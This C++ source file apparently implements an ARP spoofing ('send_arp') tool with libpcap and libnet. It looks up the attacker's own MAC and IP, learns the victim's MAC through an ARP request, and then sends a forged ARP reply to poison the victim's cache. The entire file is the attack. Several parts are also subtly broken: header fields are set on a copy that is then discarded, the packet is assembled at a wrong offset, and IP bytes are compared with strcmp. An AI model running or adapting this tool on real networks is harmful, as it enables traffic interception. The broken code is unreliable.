#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-headers.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <cstring>
#include <iostream>

using namespace std;

struct libnet_ethernet_hdr ehtH;
//struct libnet_arp_hdr arpH;
struct arp_hdr : public libnet_arp_hdr {
	u_int8_t sha[6];
	u_int8_t spa[4];
	u_int8_t tha[6];
	u_int8_t tpa[4];
} req, infec;

struct add {
	u_int8_t ip[4];
	u_int8_t mac[6];
} my, sender, target;

void getAttacker(char* dev) {
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq s;
	strcpy(s.ifr_name, dev);

	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(my.mac, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));

	ioctl(fd, SIOCGIFADDR, &s);
	memcpy(my.ip, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
}

void makearp(struct arp_hdr a, char* ti, u_int16_t arpop) {
	for(int i=0; i<6; i++) {
		ehtH.ether_dhost[i] = '\xff';
		req.sha[i] = ehtH.ether_shost[i];
		req.tha[i] = 0;
	}

	ehtH.ether_type = ntohs(ETHERTYPE_ARP);
	a.ar_hrd = ntohs(ARPHRD_ETHER);
	a.ar_pro = ntohs(ETHERTYPE_IP);
	a.ar_hln = 6;
	a.ar_pln = 4;
	a.ar_op = ntohs(arpop);
	inet_pton(AF_INET, ti, req.tpa);
}

void makepacket(u_int8_t* packet, struct arp_hdr a) {
	memcpy(packet, &ehtH, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr), &a, sizeof(struct arp_hdr));
}

int main(int argc, char* argv[]) {

	if (argc != 4) {
		return -1;
	}

	char* dev = argv[1];

	getAttacker(dev);

	memcpy(ehtH.ether_shost, my.mac, sizeof(my.mac));
	memcpy(req.spa, my.ip, sizeof(my.ip));

	char* senderip = argv[2];
	makearp(req, senderip, ARPOP_REQUEST);
	makearp(infec, argv[3], ARPOP_REPLY);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arp_hdr);
	u_int8_t arppacket[size], arp_infec_packet[size];

	makepacket(arppacket, req);

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		pcap_sendpacket(handle, arppacket, size);

		struct libnet_ethernet_hdr* replyehtH = (struct libnet_ethernet_hdr *)packet;

		if(ntohs(replyehtH->ether_type) == ETHERTYPE_ARP) {
			packet += sizeof(struct libnet_ethernet_hdr);
			packet += sizeof(struct libnet_arp_hdr);
			struct arp_hdr* reply = (struct arp_hdr *)packet;
			if(strcmp((char*)req.tpa, (char*)reply->spa) == 0){
				for(int i=0; i<6; i++) infec.tha[i] = reply->sha[i];
				break;
			}
		}
	}

	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = infec.tha[i];
//	inet_pton(AF_INET, argv[3], infec.spa);
//	arpH.ar_op = ntohs(ARPOP_REPLY);
	makepacket(arp_infec_packet, infec);

	pcap_sendpacket(handle, arp_infec_packet, size);

//	while (true) {
//		res = pcap_next_ex(handle, &header, &packet);
//		if (res == 0) continue;
//		if (res == -1 || res == -2) break;
//
//		struct libnet_ethernet_hdr* check_ehtH = (struct libnet_ethernet_hdr *)packet;
//		switch(ntohs(check_ehtH->ether_type)){
//			case ETHERTYPE_IP : break;
//			case ETHERTYPE_ARP : break;
//			default : break;
//		}
//	}

	pcap_close(handle);
	cout << endl;
	return 0;
}
